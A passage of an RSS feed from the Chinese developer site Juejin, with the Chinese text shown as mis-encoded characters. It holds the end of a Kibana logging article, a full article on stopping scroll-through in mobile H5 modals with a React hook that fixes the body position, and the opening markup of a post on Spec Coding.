<p>é…ç½®å®Œæˆåï¼Œåœ¨ Kibana çš„ Discover é¢æ¿ä¸­ï¼Œä¸ä»…èƒ½çœ‹åˆ°ç³»ç»Ÿçš„å¯åŠ¨æ—¥å¿—ï¼Œè¿˜èƒ½å±•å¼€æ¯ä¸€æ¡ HTTP è¯·æ±‚ï¼ŒæŸ¥çœ‹ç”¨æˆ·åˆ°åº•ä¼ äº†ä»€ä¹ˆå‚æ•°ï¼ˆ<code>req.body</code>ï¼‰ï¼Œä»¥åŠç³»ç»Ÿåˆ°åº•è¿”å›äº†ä»€ä¹ˆï¼ˆ<code>res.body</code>ï¼‰ã€‚</p>
<p>è‡³æ­¤ï¼Œä¸€ä¸ªè½»é‡çº§ä½†åŠŸèƒ½å®Œå¤‡çš„æ—¥å¿—ç›‘æ§ç³»ç»Ÿå°±æ­å»ºå®Œæˆäº†ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ç§»åŠ¨ç«¯H5å¼¹çª—â€œæ»šåŠ¨ç©¿é€â€çš„ç»ˆæè§£å†³æ–¹æ¡ˆï¼šä¸ºä»€ä¹ˆ overflow: hidden æ²¡ç”¨ï¼Ÿ]]></title>    <link>https://juejin.cn/post/7583891046205882420</link>    <guid>https://juejin.cn/post/7583891046205882420</guid>    <pubDate>2025-12-15T10:26:59.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583891046205882420" data-draft-id="7583921477613076515" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ç§»åŠ¨ç«¯H5å¼¹çª—â€œæ»šåŠ¨ç©¿é€â€çš„ç»ˆæè§£å†³æ–¹æ¡ˆï¼šä¸ºä»€ä¹ˆ overflow: hidden æ²¡ç”¨ï¼Ÿ"/> <meta itemprop="keywords" content="APP"/> <meta itemprop="datePublished" content="2025-12-15T10:26:59.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="JQ_Zhang"/> <meta itemprop="url" content="https://juejin.cn/user/1871846865110249"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ç§»åŠ¨ç«¯H5å¼¹çª—â€œæ»šåŠ¨ç©¿é€â€çš„ç»ˆæè§£å†³æ–¹æ¡ˆï¼šä¸ºä»€ä¹ˆ overflow: hidden æ²¡ç”¨ï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1871846865110249/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    JQ_Zhang
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-15T10:26:59.000Z" title="Mon Dec 15 2025 10:26:59 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ç§»åŠ¨ç«¯å¼¹çª—â€œæ»šåŠ¨ç©¿é€â€çš„ç»ˆæè§£å†³æ–¹æ¡ˆï¼šä¸ºä»€ä¹ˆ overflow: hidden æ²¡ç”¨ï¼Ÿ</h2>
<p>åœ¨ç§»åŠ¨ç«¯ H5 å¼€å‘ä¸­ï¼Œ<strong>â€œæ»šåŠ¨ç©¿é€â€</strong>ï¼ˆScroll Chaining / Ghost Scrollï¼‰ç»å¯¹æ˜¯è®©æ— æ•°å‰ç«¯å¼€å‘è€…è¡€å‹å‡é«˜çš„ç»å…¸ Bug ä¹‹ä¸€ã€‚</p>
<h3 data-id="heading-1">ä»€ä¹ˆæ˜¯â€œæ»šåŠ¨ç©¿é€â€ï¼Ÿ</h3>
<p>åœºæ™¯å¾ˆç®€å•ï¼š</p>
<ol>
<li>ä½ æ‰“å¼€äº†ä¸€ä¸ªå…¨å±å¼¹çª—ï¼ˆModal/Popupï¼‰ã€‚</li>
<li>å¼¹çª—ä¸‹é¢æœ‰ä¸€å±‚é•¿åˆ—è¡¨èƒŒæ™¯ã€‚</li>
<li>å½“ä½ åœ¨å¼¹çª—ä¸Šæ»‘åŠ¨æ‰‹æŒ‡æ—¶ï¼Œ<strong>åº•ä¸‹çš„èƒŒæ™¯é¡µé¢ç«Ÿç„¶è·Ÿç€ä¸€èµ·æ»šåŠ¨äº†ï¼</strong></li>
</ol>
<p>è¿™ä¸ä»…ä½“éªŒæå·®ï¼Œè¿˜å®¹æ˜“å¯¼è‡´å¼¹çª—é”™ä½æˆ–ç”¨æˆ·è¿·å¤±ä¸Šä¸‹æ–‡ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/daa717b4ab5b45c6a76e447eb36fdef6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSlFfWmhhbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766399218&amp;x-signature=QmXSgtA9FSXhxBGZ5gS5lVzGf2I%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-2">å¸¸è§è¯¯åŒºï¼šä»¥ä¸º CSS å°±èƒ½æå®š</h3>
<p>å¤§å¤šæ•°äººçš„ç¬¬ä¸€ååº”æ˜¯ï¼šâ€œè¿™è¿˜ä¸ç®€å•ï¼Ÿç»™ body åŠ ä¸ª <code>overflow: hidden</code> ä¸å°±è¡Œäº†ï¼Ÿâ€</p>
<p>/* âŒ åªæœ‰ PC ç«¯æœ‰æ•ˆï¼Œç§»åŠ¨ç«¯ç»å¸¸ç¿»è½¦ */
body.modal-open {
overflow: hidden;
}<strong>ä¸ºä»€ä¹ˆå¤±æ•ˆï¼Ÿ</strong>
åœ¨ PC ç«¯ï¼Œ<code>overflow: hidden</code> ç¡®å®èƒ½éšè—æ»šåŠ¨æ¡å¹¶ç¦æ­¢æ»šåŠ¨ã€‚ä½†åœ¨ç§»åŠ¨ç«¯ï¼ˆç‰¹åˆ«æ˜¯ iOS Safariï¼‰ï¼Œæµè§ˆå™¨è®¤ä¸º <code>body</code> çš„æ»šåŠ¨æ˜¯â€œè§†å£ï¼ˆViewportï¼‰â€çº§åˆ«çš„ç‰¹æ€§ã€‚å³ä½¿ä½ ç¦ç”¨äº† <code>body</code> çš„æº¢å‡ºï¼Œç”¨æˆ·æ‰‹æŒ‡åœ¨å±å¹•ä¸Šæ‹–æ‹½ï¼ˆTouch Eventsï¼‰æ—¶ï¼Œæµè§ˆå™¨ä¾ç„¶ä¼šè§¦å‘é»˜è®¤çš„æ»šåŠ¨è¡Œä¸ºï¼Œç”šè‡³å¼•å‘æ©¡çš®ç­‹æ•ˆæœã€‚</p>
<h3 data-id="heading-3">è¿›é˜¶æ–¹æ¡ˆï¼šé˜»æ­¢ touchmoveï¼ˆæœ‰å‰¯ä½œç”¨ï¼‰</h3>
<p>ç¬¬äºŒç§å¸¸è§çš„æ–¹æ¡ˆæ˜¯ç›´æ¥é˜»æ­¢å¼¹çª—é®ç½©å±‚çš„è§¦æ‘¸äº‹ä»¶ï¼š</p>
<p>// âŒ è¿™ç§ä¸€åˆ€åˆ‡çš„æ–¹æ¡ˆä¼šå¯¼è‡´å¼¹çª—å†…éƒ¨ä¹Ÿæ— æ³•æ»šåŠ¨
<code>modal.addEventListener('touchmove', (e) =&gt; {   e.preventDefault(); }, { passive: false });</code></p>
<p><strong>å±€é™æ€§ï¼š</strong>
å¦‚æœä½ çš„å¼¹çª—å†…éƒ¨æœ¬èº«å°±éœ€è¦æ»šåŠ¨ï¼ˆæ¯”å¦‚ä¸€ä¸ªé•¿é•¿çš„è¯­è¨€é€‰æ‹©åˆ—è¡¨ï¼‰ï¼Œè¿™è¡Œä»£ç ä¼šæŠŠå¼¹çª—å†…éƒ¨çš„æ»šåŠ¨ä¹Ÿä¸€å¹¶æ€æ‰ï¼Œå¯¼è‡´â€œæ­»é”â€ã€‚è™½ç„¶å¯ä»¥é€šè¿‡åˆ¤æ–­ <code>target</code> æ¥ä¼˜åŒ–ï¼Œä½†é€»è¾‘éå¸¸ç¹çã€‚</p>
<h3 data-id="heading-4">ç»ˆæè§£å†³æ–¹æ¡ˆï¼šBody å›ºå®šå®šä½æ³•ï¼ˆPosition Fixedï¼‰</h3>
<p>ç›®å‰ä¸šç•Œï¼ˆåŒ…æ‹¬ Ant Design Mobile, Vant ç­‰ä¸»æµç»„ä»¶åº“ï¼‰å…¬è®¤çš„æœ€ç¨³å¦¥æ–¹æ¡ˆï¼Œå°±æ˜¯**â€œBody å›ºå®šå®šä½æ³•â€**ã€‚</p>
<h4 data-id="heading-5">æ ¸å¿ƒåŸç†</h4>
<p>æ—¢ç„¶ç¦æ­¢æ»šåŠ¨å¤±æ•ˆï¼Œé‚£æˆ‘ä»¬å°±<strong>ä»ç‰©ç†ä¸Šåˆ‡æ–­æ»šåŠ¨çš„å¯èƒ½</strong>ã€‚
å½“å¼¹çª—æ‰“å¼€æ—¶ï¼Œæˆ‘ä»¬å°† <code>body</code> è®¾ç½®ä¸º <code>position: fixed</code>ã€‚ä¸€ä¸ªå›ºå®šå®šä½çš„å…ƒç´ ï¼Œå¤©ç„¶å°±æ˜¯æ­»æ­»é’‰åœ¨å±å¹•ä¸Šçš„ï¼Œæ— è®ºä½ æ€ä¹ˆæ»‘ï¼Œå®ƒéƒ½ä¸å¯èƒ½åŠ¨ã€‚</p>
<h4 data-id="heading-6">å¸¦æ¥çš„æ–°é—®é¢˜ï¼šé¡µé¢è·³é¡¶</h4>
<p>å•çº¯è®¾ç½® <code>position: fixed</code> ä¼šå¯¼è‡´ä¸€ä¸ªä¸¥é‡çš„å‰¯ä½œç”¨ï¼š<strong>é¡µé¢ä¼šç¬é—´è·³å›åˆ°é¡¶éƒ¨</strong>ã€‚å› ä¸ºè„±ç¦»æ–‡æ¡£æµåï¼Œ<code>scrollTop</code> ä¸¢å¤±äº†ã€‚</p>
<h4 data-id="heading-7">å®Œæ•´ä»£ç å®ç°</h4>
<p>ä¸ºäº†è§£å†³è·³é¡¶é—®é¢˜ï¼Œæˆ‘ä»¬éœ€è¦åœ¨â€œé”å®šâ€å‰è®°å½•å½“å‰çš„æ»šåŠ¨ä½ç½®ï¼Œå¹¶åœ¨â€œè§£é”â€åæ¢å¤å®ƒã€‚</p>
<p>è¿™æ­£æ˜¯æˆ‘ä»¬é¡¹ç›® <code>Popup</code> ç»„ä»¶ä¸­é‚£æ®µ useEffect ä»£ç çš„é€»è¾‘ï¼š</p>
<p>// React Hook ç¤ºä¾‹</p>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">if</span> (visible) {
    <span class="hljs-comment">// 1. ğŸ”’ é”å®šï¼šè®°å½•ä½ç½®å¹¶å›ºå®š Body</span>
    <span class="hljs-keyword">const</span> scrollTop = <span class="hljs-variable language_">window</span>.<span class="hljs-property">scrollY</span> || <span class="hljs-variable language_">document</span>.<span class="hljs-property">documentElement</span>.<span class="hljs-property">scrollTop</span>;
    
    <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">style</span>.<span class="hljs-property">position</span> = <span class="hljs-string">'fixed'</span>;
    <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">style</span>.<span class="hljs-property">top</span> = <span class="hljs-string">`-<span class="hljs-subst">${scrollTop}</span>px`</span>; <span class="hljs-comment">// æŠŠé¡µé¢â€œæ‹‰â€å›åŸæ¥çš„è§†è§‰ä½ç½®</span>
    <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">style</span>.<span class="hljs-property">width</span> = <span class="hljs-string">'100%'</span>;
    
    <span class="hljs-comment">// å­˜èµ·æ¥ï¼Œä¸€ä¼šå„¿è¿˜è¦ç”¨</span>
    <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">dataset</span>.<span class="hljs-property">scrollY</span> = scrollTop.<span class="hljs-title function_">toString</span>();
    
  } <span class="hljs-keyword">else</span> {
    <span class="hljs-comment">// 2. ğŸ”“ è§£é”ï¼šæ¢å¤æ ·å¼å¹¶æ»šåŠ¨å›å»</span>
    <span class="hljs-keyword">const</span> scrollTop = <span class="hljs-built_in">parseInt</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">dataset</span>.<span class="hljs-property">scrollY</span> || <span class="hljs-string">'0'</span>, <span class="hljs-number">10</span>);
    
    <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">style</span>.<span class="hljs-property">position</span> = <span class="hljs-string">''</span>;
    <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">style</span>.<span class="hljs-property">top</span> = <span class="hljs-string">''</span>;
    <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">style</span>.<span class="hljs-property">width</span> = <span class="hljs-string">''</span>;
    
    <span class="hljs-comment">// æ¢å¤æ»šåŠ¨ä½ç½®ï¼Œè®©ç”¨æˆ·æ— æ„ŸçŸ¥</span>
    <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">scrollTo</span>(<span class="hljs-number">0</span>, scrollTop);
  }
}, [visible]);
</code></pre>
<h4 data-id="heading-8">ä»£ç è§£æ</h4>
<ol>
<li><strong><code>document.body.style.position = 'fixed'</code></strong>ï¼šè¿™æ˜¯æ ¸å¿ƒï¼Œå¼ºåˆ¶ç¦æ­¢æ»šåŠ¨ã€‚</li>
<li><strong><code>top = -${scrollTop}px</code></strong>ï¼šè¿™æ˜¯ç²¾é«“ã€‚å‡è®¾ä½ æ»šåˆ°äº† 500px çš„ä½ç½®ï¼Œä¸ºäº†é˜²æ­¢å˜ä¸º fixed åè·³å› 0pxï¼Œæˆ‘ä»¬ç»™ body ä¸€ä¸ª <code>-500px</code> çš„åç§»é‡ï¼Œè§†è§‰ä¸Šé¡µé¢å°±çº¹ä¸ä¸åŠ¨äº†ã€‚</li>
<li><strong><code>window.scrollTo(0, scrollTop)</code></strong>ï¼šå…³é—­å¼¹çª—æ—¶ï¼Œè§£é™¤ fixedï¼Œæ­¤æ—¶é¡µé¢çœŸçš„å›åˆ°äº† 0pxï¼Œæˆ‘ä»¬å¿…é¡»ç«‹å³ç”¨ JS æŠŠå®ƒæ»šå›åˆ°ä¹‹å‰çš„ 500pxï¼Œå®ç°æ— ç¼è¡”æ¥ã€‚</li>
</ol>
<h3 data-id="heading-9">æ€»ç»“</h3>
<p>è™½ç„¶è¿™æ®µ JS ä»£ç çœ‹èµ·æ¥æœ‰ç‚¹â€œé‡â€ï¼Œç”šè‡³æ“ä½œäº† DOMï¼Œä½†å®ƒç›®å‰æ˜¯è§£å†³ç§»åŠ¨ç«¯ï¼ˆå°¤å…¶æ˜¯ iOSï¼‰æ»šåŠ¨ç©¿é€é—®é¢˜<strong>å…¼å®¹æ€§æœ€å¥½ã€å‰¯ä½œç”¨æœ€å°</strong>çš„æ–¹æ¡ˆã€‚</p>
<p>ä¸‹æ¬¡é‡åˆ°å¼¹çª—æ»šåŠ¨ç©¿é€ï¼Œåˆ«å†çº ç»“ <code>overflow: hidden</code> äº†ï¼Œç›´æ¥ä¸Šâ€œBody å›ºå®šå®šä½æ³•â€å§ï¼</p>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[åˆ«å†â€œè‹¦åŠ›â€å†™åå°ï¼ŒSpec Coding â€œè·‘â€ èµ·æ¥]]></title>    <link>https://juejin.cn/post/7583892482598436879</link>    <guid>https://juejin.cn/post/7583892482598436879</guid>    <pubDate>2025-12-15T10:52:15.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583892482598436879" data-draft-id="7583891046205849652" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="åˆ«å†â€œè‹¦åŠ›â€å†™åå°ï¼ŒSpec Coding  â€œè·‘â€ èµ·æ¥"/> <meta itemprop="keywords" content="å‰ç«¯,AIç¼–ç¨‹"/> <meta itemprop="datePublished" content="2025-12-15T10:52:15.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é›ªçƒå·¥ç¨‹å¸ˆå›¢é˜Ÿ"/> <meta itemprop="url" content="https://juejin.cn/user/2664871914644525"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            åˆ«å†â€œè‹¦åŠ›â€å†™åå°ï¼ŒSpec Coding  â€œè·‘â€ èµ·æ¥
            <!----> <!----></h1> <div class="container team-follow" data-v-d326b38e="" data-v-61fb5e44=""><div class="left" data-v-d326b38e=""><a href="/team/6942370795716870178/posts" data-v-d326b38e=""><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/962ff7fb0a7e485e8a67c02675746756~tplv-k3u1fbpfcp-watermark.image" class="icon" data-v-d326b38e=""/></a> <div class="content" data-v-d326b38e=""><div style="display: flex" data-v-d326b38e=""><a href="/team/6942370795716870178/posts" data-v-d326b38e=""><p class="title-line" data-v-d326b38e=""><span title="é›ªçƒå·¥ç¨‹å¸ˆå›¢é˜Ÿ" class="title" data-v-d326b38e="">é›ªçƒå·¥ç¨‹å¸ˆå›¢é˜Ÿ</span> <img src="//lf-web-assets.juejin.cn/obj/juejin-web/xitu_juejin_web/255e400027b783cbad76dc41527e7695.svg" alt="team icon" class="team-icon" data-v-d326b38e=""/></p></a></div> <div class="meta-box team" data-v-d326b38e="" data-v-61fb5e44=""><time datetime="2025-12-15T10:52:15.000Z" title="Mon Dec 15 2025 10:52:15 GMT+0000 (Coordinated Universal Time)" class="time" data-v-d326b38e="" data-v-61fb5e44="">
                2025-12-15
              </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-d326b38e="" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-d326b38e="" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-d326b38e="" data-v-61fb5e44=""/></svg> <span class="views-count" style="display:none;" data-v-d326b38e="" data-v-61fb5e44="">
                0
              </span> <span class="read-time" data-v-d326b38e="" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-d326b38e="" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-d326b38e="" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-d326b38e="" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-d326b38e="" data-v-61fb5e44=""/></svg>
                é˜…è¯»12åˆ†é’Ÿ
              </span> <!----> <!----></div></div></div> <button class="jj-follow-button follow-btn" style="display:none;" data-v-b60b2868="" data-v-d326b38e=""><span data-v-b60b2868="" data-v-d326b38e=""><i class="byte-icon byte-icon--plus" data-v-d326b38e=""><svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 48 48"><path fill="none" d="M0 0h48v48H0z"/><path d="M24.7 4c.4 0 .6 0 .8.1.2.1.3.2.4.4.1.2.1.3.1.8V22h16.7c.4 0 .6 0 .8.1.2.1.3.2.4.4.1.2.1.3.1.8v1.4c0 .4 0 .6-.1.8-.1.2-.2.3-.4.4-.2.1-.3.1-.8.1H26v16.7c0 .4 0 .6-.1.8-.1.2-.2.3-.4.4-.2.1-.3.1-.8.1h-1.4c-.4 0-.6 0-.8-.1-.2-.1-.3-.2-.4-.4-.1-.2-.1-.3-.1-.8V26H5.3c-.4 0-.6 0-.8-.1-.2-.1-.3-.2-.4-.4-.1-.2-.1-.3-.1-.8v-1.4c0-.4 0-.6.1-.8.1-.2.2-.3.4-.4.2-.1.3-.1.8-.1H22V5.3c0-.4 0-.6.1-.8.1-.2.2-.3.4-.4.2-.1.3-.1.8-.1h1.4z"/></svg></i>
        å…³æ³¨
      </span></button></div> <div class="team-user block-hidden" data-v-61fb5e44=""><div class="avatar jj-avatar avatar" data-v-03256cc6="" data-v-61fb5e44=""><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADwAAAA8AQMAAAAAMksxAAAAA1BMVEUAAACnej3aAAAAAXRSTlMAQObYZgAAAA5JREFUKM9jGAWjAAcAAAIcAAE27nY6AAAAAElFTkSuQmCC" alt="avatar" class="lazy avatar-img" data-v-5244ef91="" data-v-03256cc6=""/> </div> <!----> <span class="position ellipsis" data-v-61fb5e44="">
              @é›ªçƒè´¢ç»
            </span></div> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body 